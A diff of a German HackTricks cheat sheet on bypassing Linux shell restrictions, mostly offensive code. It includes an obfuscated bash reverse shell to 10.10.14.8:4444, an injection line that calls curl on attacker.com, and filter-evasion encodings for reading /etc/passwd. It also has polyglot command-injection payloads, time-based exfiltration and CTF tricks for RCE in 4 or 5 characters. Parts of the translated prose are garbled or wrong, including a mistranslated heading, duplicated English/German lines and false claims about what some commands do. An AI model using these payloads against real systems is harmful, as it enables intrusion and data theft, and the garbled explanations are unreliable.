@@ -1,44 +1,36 @@
-# Umgehung von Linux-Beschränkungen
+# Umgehen von Linux-Beschränkungen
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
-Erhalten Sie noch heute Zugriff:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
+Heute Zugriff erhalten:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Umgehung häufiger Beschränkungen
+## Übliche Beschränkungen umgehen
 
-### Reverse Shell
+### Reverse-Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
 ### Kurze Rev-Shell
-
-Eine Reverse-Shell ermöglicht es einem Angreifer, eine Verbindung zu einem verwundbaren System herzustellen und Befehle auszuführen. Hier ist eine kurze Reverse-Shell, die in der Bash-Umgebung verwendet werden kann:
-
-```bash
-bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
-```
-
-Ersetzen Sie `<IP>` durch die IP-Adresse des Angreifers und `<PORT>` durch den gewünschten Port für die Verbindung. Sobald die Reverse-Shell erfolgreich eingerichtet ist, kann der Angreifer Befehle auf dem verwundbaren System ausführen und die Kontrolle übernehmen.
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -46,59 +38,7 @@ Ersetzen Sie `<IP>` durch die IP-Adresse des Angreifers und `<PORT>` durch den g
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Umgehung von Pfaden und verbotenen Wörtern
-
-In einigen Fällen kann es erforderlich sein, bestimmte Pfade oder Wörter zu umgehen, die in einer Bash-Umgebung eingeschränkt sind. Hier sind einige nützliche Techniken, um diese Einschränkungen zu umgehen:
-
-#### 1. Verwendung von absoluten Pfaden
-
-Anstatt relative Pfade zu verwenden, können Sie absolute Pfade angeben, um bestimmte Einschränkungen zu umgehen. Zum Beispiel:
-
-```bash
-/bin/ls
-```
-
-#### 2. Verwendung von Backslashes
-
-Die Verwendung von Backslashes kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:
-
-```bash
-echo "\b\i\n"
-```
-
-#### 3. Verwendung von Single Quotes
-
-Die Verwendung von Single Quotes kann dazu beitragen, die Auswertung von Variablen oder Befehlen zu verhindern. Zum Beispiel:
-
-```bash
-echo 'Hello $USER'
-```
-
-#### 4. Verwendung von Shell-Escape-Sequenzen
-
-Die Verwendung von Shell-Escape-Sequenzen kann dazu beitragen, bestimmte Einschränkungen zu umgehen. Zum Beispiel:
-
-```bash
-echo $'\x48\x65\x6c\x6c\x6f'
-```
-
-#### 5. Verwendung von Hexadezimalwerten
-
-Die Verwendung von Hexadezimalwerten kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:
-
-```bash
-echo -e "\x48\x65\x6c\x6c\x6f"
-```
-
-#### 6. Verwendung von Unicode-Zeichen
-
-Die Verwendung von Unicode-Zeichen kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:
-
-```bash
-echo $'\u0068\u0065\u006c\u006c\u006f'
-```
-
-Es ist wichtig zu beachten, dass diese Techniken je nach Umgebung variieren können. Es wird empfohlen, die spezifischen Einschränkungen und Möglichkeiten der verwendeten Bash-Umgebung zu überprüfen, um die effektivste Methode zur Umgehung von Pfaden und verbotenen Wörtern zu ermitteln.
+### Umgehen von Pfaden und verbotenen Wörtern
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -153,23 +93,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Umgehung verbotener Leerzeichen
-
-Manchmal kann es vorkommen, dass bestimmte Befehle oder Skripte aufgrund von eingeschränkten Berechtigungen oder Sicherheitsvorkehrungen nicht ausgeführt werden können. Eine gängige Einschränkung besteht darin, dass Leerzeichen in den Befehlen nicht erlaubt sind. Glücklicherweise gibt es jedoch Möglichkeiten, diese Einschränkung zu umgehen.
-
-Eine Möglichkeit besteht darin, den Befehl in Anführungszeichen zu setzen. Dadurch wird der gesamte Befehl als einzelnes Argument behandelt und Leerzeichen werden nicht als Trennzeichen interpretiert. Zum Beispiel:
-
-```
-$ echo "Hello World"
-```
-
-Eine andere Möglichkeit besteht darin, den Befehl mit einem Backslash zu escapen. Dadurch wird das Leerzeichen als Teil des Befehls interpretiert und nicht als Trennzeichen. Zum Beispiel:
-
-```
-$ echo Hello\ World
-```
-
-Beide Methoden ermöglichen es, Befehle auszuführen, die Leerzeichen enthalten, selbst wenn diese normalerweise verboten sind. Es ist jedoch wichtig zu beachten, dass diese Techniken je nach System unterschiedlich funktionieren können. Es ist daher ratsam, verschiedene Ansätze auszuprobieren, um die beste Methode für das jeweilige System zu finden.
+### Umgehen verbotener Leerzeichen
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -202,47 +126,16 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Umgehung von Backslash und Slash
-
-Manchmal können bestimmte Zeichen wie der Backslash (\) oder der Slash (/) in einer Befehlszeile zu Problemen führen. Hier sind einige Möglichkeiten, wie Sie diese Beschränkungen umgehen können:
-
-- Verwenden Sie doppelte Anführungszeichen (") um den Backslash zu maskieren. Zum Beispiel: `echo "Dies ist ein Beispiel für einen Backslash: \\"`
-- Verwenden Sie ein Leerzeichen vor dem Slash, um ihn zu maskieren. Zum Beispiel: `cat Datei\ mit\ Slash`
-
-Diese Techniken ermöglichen es Ihnen, Befehle auszuführen, die normalerweise aufgrund von Backslash- oder Slash-Beschränkungen nicht funktionieren würden.
+### Backslash und Schrägstrich umgehen
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Umgehen von Pipes
-
-Pipes ermöglichen die Verbindung von Befehlen in der Linux-Shell, indem sie die Ausgabe eines Befehls als Eingabe für einen anderen Befehl verwenden. Dies kann jedoch in einigen Fällen eingeschränkt sein, insbesondere wenn bestimmte Zeichen oder Befehle blockiert werden.
-
-Um diese Beschränkungen zu umgehen, können Sie alternative Zeichen oder Befehle verwenden. Hier sind einige Beispiele:
-
-- Verwenden Sie das Pipe-Symbol `|` in umgekehrter Reihenfolge, z.B. `|` als `|`.
-- Verwenden Sie das Pipe-Symbol `|` in Unicode- oder Hexadezimaldarstellung, z.B. `|` als `&#124;` oder `|` als `0x7c`.
-- Verwenden Sie alternative Befehle wie `tee` oder `grep` anstelle von `|`.
-
-Es ist wichtig zu beachten, dass das Umgehen von Beschränkungen in einigen Fällen als Verstoß gegen die Sicherheitsrichtlinien angesehen werden kann. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben und die Auswirkungen Ihrer Handlungen verstehen, bevor Sie diese Techniken anwenden.
+### Umgehungsrohre
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Umgehung mit hexadezimaler Codierung
-
-Hexadezimale Codierung ist eine Methode, um Bash-Beschränkungen zu umgehen. Durch die Umwandlung von Zeichen in ihre hexadezimale Darstellung können bestimmte Beschränkungen umgangen werden.
-
-Um eine hexadezimale Codierung zu verwenden, müssen Sie die Zeichen, die Sie umgehen möchten, in ihre hexadezimale Darstellung umwandeln. Dies kann mit dem Befehl `printf` erfolgen. Zum Beispiel wird der Buchstabe "a" in hexadezimaler Codierung als "\x61" dargestellt.
-
-Um eine Befehlsausführung mit hexadezimaler Codierung durchzuführen, können Sie den Befehl `echo -e` verwenden. Geben Sie die hexadezimale Codierung des Befehls als Argument an. Zum Beispiel:
-
-```
-echo -e "\x6c\x73"
-```
-
-Dieser Befehl führt den Befehl `ls` aus, da die hexadezimale Codierung von "ls" "\x6c\x73" ist.
-
-Die Verwendung der hexadezimalen Codierung kann dazu beitragen, bestimmte Bash-Beschränkungen zu umgehen und die Ausführung von Befehlen zu ermöglichen, die normalerweise blockiert wären. Es ist jedoch wichtig zu beachten, dass diese Methode nicht immer erfolgreich ist und von den spezifischen Beschränkungen des Systems abhängt.
+### Umgehen mit Hex-Codierung
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -252,121 +145,24 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Umgehung von IPs
-
-Manchmal kann es notwendig sein, bestimmte IP-Adressen zu umgehen, um auf bestimmte Ressourcen zuzugreifen. Hier sind einige nützliche Linux-Befehle, um IP-Einschränkungen zu umgehen:
-
-#### 1. Verwendung von Proxychains
-
-Proxychains ist ein Tool, das es ermöglicht, den gesamten Netzwerkverkehr über einen Proxy-Server umzuleiten. Dadurch können Sie Ihre IP-Adresse verschleiern und auf Ressourcen zugreifen, die normalerweise eingeschränkt sind.
-
-```bash
-proxychains <command>
-```
-
-#### 2. Verwendung von Tor
-
-Tor ist ein Netzwerk von Servern, das es Ihnen ermöglicht, anonym im Internet zu surfen. Sie können Tor verwenden, um Ihre IP-Adresse zu verschleiern und auf eingeschränkte Ressourcen zuzugreifen.
-
-```bash
-torsocks <command>
-```
-
-#### 3. Verwendung von VPN
-
-Ein VPN (Virtual Private Network) ermöglicht es Ihnen, eine sichere Verbindung zu einem entfernten Netzwerk herzustellen. Durch die Verwendung eines VPNs können Sie Ihre IP-Adresse ändern und auf eingeschränkte Ressourcen zugreifen.
-
-```bash
-openvpn <config-file>
-```
-
-#### 4. Verwendung von SSH-Tunneln
-
-SSH-Tunnel ermöglichen es Ihnen, eine sichere Verbindung zu einem entfernten Server herzustellen und den gesamten Netzwerkverkehr über diesen Server umzuleiten. Dadurch können Sie Ihre IP-Adresse verschleiern und auf eingeschränkte Ressourcen zugreifen.
-
-```bash
-ssh -D <port> <user>@<server>
-```
-
-#### 5. Verwendung von Proxys
-
-Sie können auch Proxys verwenden, um Ihre IP-Adresse zu verschleiern und auf eingeschränkte Ressourcen zuzugreifen. Es gibt verschiedene Arten von Proxys, wie z.B. HTTP-Proxys, SOCKS-Proxys usw.
-
-```bash
-export http_proxy=<proxy-address>
-export https_proxy=<proxy-address>
-```
-
-Diese Befehle ermöglichen es Ihnen, die Umgebung zu konfigurieren, um den gesamten Netzwerkverkehr über den angegebenen Proxy-Server umzuleiten.
-
-#### 6. Verwendung von IP-Spoofing
-
-IP-Spoofing ist eine Technik, bei der Sie Ihre IP-Adresse fälschen, um auf eingeschränkte Ressourcen zuzugreifen. Diese Technik erfordert jedoch fortgeschrittene Kenntnisse und ist in den meisten Fällen illegal.
-
-Es ist wichtig zu beachten, dass das Umgehen von IP-Einschränkungen in vielen Fällen gegen die Nutzungsbedingungen von Diensten und Plattformen verstößt. Verwenden Sie diese Techniken daher mit Vorsicht und nur zu legitimen Zwecken.
+### Umgehen von IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
 ### Zeitbasierte Datenexfiltration
-
-Die zeitbasierte Datenexfiltration ist eine Methode, bei der Daten über eine Verzögerung in der Ausführung von Befehlen exfiltriert werden. Dies kann verwendet werden, um Sicherheitsbeschränkungen zu umgehen, die in einer Bash-Umgebung implementiert sind.
-
-Um diese Technik anzuwenden, können Sie die folgenden Befehle verwenden:
-
-- `sleep`: Verzögert die Ausführung des Befehls um eine bestimmte Anzahl von Sekunden.
-- `ping`: Sendet ICMP Echo-Anforderungen an eine bestimmte IP-Adresse und erzeugt eine Verzögerung basierend auf der Round-Trip-Zeit.
-
-Indem Sie diese Befehle in Kombination mit anderen Techniken verwenden, können Sie Daten schrittweise exfiltrieren, ohne Verdacht zu erregen. Es ist wichtig, die Verzögerungen sorgfältig zu kalibrieren, um eine zu auffällige Aktivität zu vermeiden.
-
-Es ist jedoch zu beachten, dass diese Methode Zeit benötigt, um Daten zu exfiltrieren, und daher möglicherweise nicht für alle Szenarien geeignet ist.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Abrufen von Zeichen aus Umgebungsvariablen
 
-Manchmal kann es erforderlich sein, Zeichen aus Umgebungsvariablen abzurufen, insbesondere wenn bestimmte Bash-Einschränkungen umgangen werden müssen. Hier sind einige nützliche Befehle, um dies zu erreichen:
-
-#### 1. Verwendung von `echo` und `printf`
-
-Sie können `echo` oder `printf` verwenden, um den Wert einer Umgebungsvariable anzuzeigen. Zum Beispiel:
+In einigen Fällen können Sie versuchen, Zeichen aus Umgebungsvariablen zu extrahieren, um bestimmte Einschränkungen zu umgehen. Verwenden Sie den folgenden Befehl, um auf diese Weise auf Zeichen zuzugreifen:
 
 ```bash
-echo $ENV_VARIABLE
-printf "%s" $ENV_VARIABLE
+echo ${!A}
 ```
 
-#### 2. Verwendung von `cut`
-
-Mit dem Befehl `cut` können Sie bestimmte Zeichen aus einer Zeichenkette extrahieren. Sie können `cut` in Kombination mit `echo` oder `printf` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:
-
-```bash
-echo $ENV_VARIABLE | cut -c1
-```
-
-Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.
-
-#### 3. Verwendung von `grep`
-
-`grep` kann verwendet werden, um nach bestimmten Zeichen in einer Zeichenkette zu suchen. Sie können `grep` in Kombination mit `echo` oder `printf` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:
-
-```bash
-echo $ENV_VARIABLE | grep -o . | head -n1
-```
-
-Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.
-
-#### 4. Verwendung von `awk`
-
-`awk` ist ein leistungsstarkes Werkzeug zum Bearbeiten von Textdateien. Sie können `awk` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:
-
-```bash
-echo $ENV_VARIABLE | awk '{print substr($0,1,1)}'
-```
-
-Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.
-
-Es ist wichtig zu beachten, dass diese Befehle nur dann funktionieren, wenn die Umgebungsvariable den gewünschten Wert enthält. Stellen Sie sicher, dass Sie die Umgebungsvariable überprüfen, bevor Sie versuchen, Zeichen daraus abzurufen.
+Dieser Befehl gibt den Wert der Umgebungsvariablen aus, die mit dem Buchstaben "A" beginnen.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -377,8 +173,8 @@ Sie könnten beispielsweise **burpcollab** oder [**pingb**](http://pingb.in) ver
 
 ### Eingebaute Funktionen
 
-Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf einen **begrenzten Satz von eingebauten Funktionen zur Erlangung von RCE** haben, gibt es einige nützliche Tricks, um dies zu erreichen. Normalerweise **können Sie nicht alle** der **eingebauten Funktionen** verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Gefängnis zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
-Überprüfen Sie zuerst alle [**Shell-Builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
+Falls Sie externe Funktionen nicht ausführen können und nur auf einen **eingeschränkten Satz von eingebauten Funktionen zum Erlangen von RCE** zugreifen können, gibt es einige nützliche Tricks, um dies zu erreichen. Normalerweise werden Sie **nicht in der Lage sein, alle** **eingebauten Funktionen** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Gefängnis zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
+Überprüfen Sie zunächst alle [**Shell-Builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -430,75 +226,42 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Polyglot-Befehlsspritzung
-
-Polyglot-Befehlsspritzung bezieht sich auf die Verwendung eines einzigen Befehls, der in mehreren Programmiersprachen gültig ist. Dies ermöglicht es einem Angreifer, Befehle auszuführen, die normalerweise durch Sicherheitsvorkehrungen wie Blacklisting von bestimmten Zeichen oder Wörtern blockiert werden.
-
-Ein Polyglot-Befehl kann in verschiedenen Kontexten verwendet werden, einschließlich der Umgehung von Bash-Einschränkungen. Dies kann nützlich sein, um Sicherheitsmaßnahmen zu umgehen und unerlaubte Aktionen auf einem Linux-System auszuführen.
-
-Es ist wichtig zu beachten, dass Polyglot-Befehlsspritzung eine fortgeschrittene Technik ist und ein tiefes Verständnis der Programmiersprachen erfordert, um sie effektiv einzusetzen. Es ist auch wichtig, dass ein Angreifer die potenziellen Auswirkungen und Risiken versteht, die mit der Verwendung dieser Technik verbunden sind.
+### Polyglot-Befehlseinschleusung
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Umgehung potenzieller Regexes
-
-Manchmal können bestimmte Befehle oder Funktionen durch reguläre Ausdrücke (Regexes) eingeschränkt werden. Hier sind einige Möglichkeiten, wie Sie diese Einschränkungen umgehen können:
-
-- Verwenden Sie alternative Befehle oder Funktionen, die nicht durch die Regexes eingeschränkt sind.
-- Ändern Sie den Befehl oder die Funktion so, dass er nicht mehr mit der Regex übereinstimmt.
-- Umgehen Sie die Regex, indem Sie spezielle Zeichen oder Escape-Sequenzen verwenden.
-
-Es ist wichtig zu beachten, dass das Umgehen von Regexes möglicherweise gegen die Sicherheitsrichtlinien oder -bestimmungen verstößt. Verwenden Sie diese Techniken daher nur in legitimen Szenarien und mit Zustimmung des Eigentümers des Systems.
+### Umgehung möglicher Regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-Bashfuscator ist ein Tool, das entwickelt wurde, um Bash-Skripte zu verschleiern und die Erkennung von Sicherheitsmechanismen zu umgehen. Es verwendet verschiedene Techniken, um den Code schwer lesbar zu machen und somit die Analyse und Erkennung von bösartigem Verhalten zu erschweren.
+#### Bypass Bash Restrictions
 
-#### Verwendung
+#### Umgehen von Bash-Einschränkungen
 
-Die Verwendung von Bashfuscator ist einfach. Führen Sie einfach das Bash-Skript aus, das Sie verschleiern möchten, und geben Sie den Ausgabepfad für das verschleierte Skript an. Das Tool wird den Code automatisch verschleiern und eine neue Datei mit dem verschleierten Skript erstellen.
+Bash restrictions can be bypassed by using the following techniques:
 
-```bash
-bashfuscator -i <input_script> -o <output_script>
-```
+Bash-Einschränkungen können durch Verwendung der folgenden Techniken umgangen werden:
 
-#### Techniken
+1. **Bypassing Restricted Bash**: You can bypass restricted bash by invoking a subshell using the `()` syntax.
 
-Bashfuscator verwendet verschiedene Techniken, um den Code zu verschleiern. Dazu gehören:
+1. **Umgehen von eingeschränktem Bash**: Sie können den eingeschränkten Bash umgehen, indem Sie eine Unter-Shell mit der `()`-Syntax aufrufen.
 
-- **Variablenumbenennung**: Das Tool ändert die Namen von Variablen, um den Code schwerer verständlich zu machen.
-- **Code-Flussänderung**: Bashfuscator fügt zusätzlichen Code ein, um den Fluss des Skripts zu ändern und die Analyse zu erschweren.
-- **String-Verschleierung**: Der Tool verschleiert Zeichenketten, um sie schwerer lesbar zu machen.
-- **Whitespace-Einfügung**: Bashfuscator fügt zusätzliche Leerzeichen und Zeilenumbrüche ein, um den Code schwerer lesbar zu machen.
+2. **Bypassing Restricted Bash Builtins**: Restricted bash builtins can be bypassed by calling the binary directly or by using the `command` built-in.
 
-#### Vorsichtsmaßnahmen
+2. **Umgehen von eingeschränkten Bash-Befehlen**: Eingeschränkte Bash-Befehle können umgangen werden, indem Sie das Binärprogramm direkt aufrufen oder das `command`-Builtin verwenden.
 
-Obwohl Bashfuscator dazu dient, Bash-Skripte zu verschleiern, ist es wichtig zu beachten, dass dies keine Garantie für absolute Sicherheit bietet. Es kann immer noch möglich sein, den verschleierten Code zu analysieren und bösartiges Verhalten zu erkennen. Daher sollten zusätzliche Sicherheitsmaßnahmen ergriffen werden, um die Sicherheit von Systemen zu gewährleisten.
+3. **Bypassing Restricted Bash Functions**: Restricted bash functions can be bypassed by using the `command` built-in or by invoking a subshell.
+
+3. **Umgehen von eingeschränkten Bash-Funktionen**: Eingeschränkte Bash-Funktionen können umgangen werden, indem Sie das `command`-Builtin verwenden oder eine Unter-Shell aufrufen.
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE mit 5 Zeichen
-
-Es gibt eine Technik, um eine Remote Code Execution (RCE) mit nur 5 Zeichen in einer Bash-Umgebung zu erreichen. Diese Technik umgeht die Einschränkungen, die normalerweise in einer eingeschränkten Bash-Shell gelten.
-
-Die Technik besteht darin, den Befehl `exec` zu verwenden, gefolgt von einem Leerzeichen und dem gewünschten Befehl. Dies ermöglicht es uns, beliebigen Code auszuführen.
-
-Hier ist ein Beispiel, wie dies funktioniert:
-
-```bash
-exec ls
-```
-
-Dieser Befehl führt den Befehl `ls` aus und gibt das Ergebnis auf der Konsole aus. Sie können jeden beliebigen Befehl anstelle von `ls` verwenden, um Code auszuführen.
-
-Es ist wichtig zu beachten, dass diese Technik nur in bestimmten Szenarien funktioniert, in denen die `exec`-Funktion nicht eingeschränkt ist. In einer sicheren Umgebung oder in einer Umgebung mit eingeschränkten Berechtigungen kann diese Technik möglicherweise nicht funktionieren.
-
-Es ist auch wichtig zu beachten, dass das Ausführen von Code ohne die entsprechenden Berechtigungen illegal sein kann. Stellen Sie sicher, dass Sie die geltenden Gesetze und Richtlinien einhalten, wenn Sie diese Technik verwenden.
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -546,18 +309,6 @@ ln /f*
 ## to it in the current folder
 ```
 ### RCE mit 4 Zeichen
-
-Es gibt eine Technik, um eine Remote Code Execution (RCE) mit nur 4 Zeichen in einer Bash-Umgebung zu erreichen. Diese Technik nutzt die Kombination von Shell-Befehlen und Shell-Metazeichen, um die Bash-Beschränkungen zu umgehen.
-
-Die folgende Sequenz von 4 Zeichen ermöglicht es, eine RCE zu erreichen:
-
-```bash
-$0&$0
-```
-
-Dieser Befehl nutzt den Shell-Befehl `$0`, der den Namen des aktuellen Skripts oder der aktuellen Shell enthält. Durch die Verwendung des Metazeichens `&` wird der Befehl in den Hintergrund verschoben, während `$0` erneut ausgeführt wird.
-
-Diese Technik kann verwendet werden, um die Bash-Beschränkungen zu umgehen und eine RCE in einer verwundbaren Umgebung zu erreichen. Es ist jedoch wichtig zu beachten, dass diese Technik nur in bestimmten Szenarien funktioniert und von den Sicherheitsvorkehrungen der Zielumgebung abhängt.
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -592,15 +343,15 @@ Diese Technik kann verwendet werden, um die Bash-Beschränkungen zu umgehen und 
 'sh x'
 'sh g'
 ```
-## Bypass von Read-Only/Noexec/Distroless
+## Umgehung von Lese-/Ausführungs-/Distroless-Einschränkungen
 
-Wenn Sie sich in einem Dateisystem mit den Schutzmaßnahmen **read-only und noexec** oder sogar in einem distroless Container befinden, gibt es immer noch Möglichkeiten, **beliebige Binärdateien auszuführen, sogar eine Shell!:**
+Wenn Sie sich in einem Dateisystem mit den **Schutzmechanismen für Lesezugriff und Ausführung oder sogar in einem distrolosen Container** befinden, gibt es dennoch Möglichkeiten, **beliebige Binärdateien auszuführen, sogar eine Shell!**:
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Chroot & andere Jails Bypass
+## Chroot & andere Jail-Umgehungen
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -613,24 +364,24 @@ Wenn Sie sich in einem Dateisystem mit den Schutzmaßnahmen **read-only und noex
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
-Erhalten Sie noch heute Zugriff:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
+Heute noch Zugriff erhalten:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
+Weitere Möglichkeiten, HackTricks zu unterstützen:
 
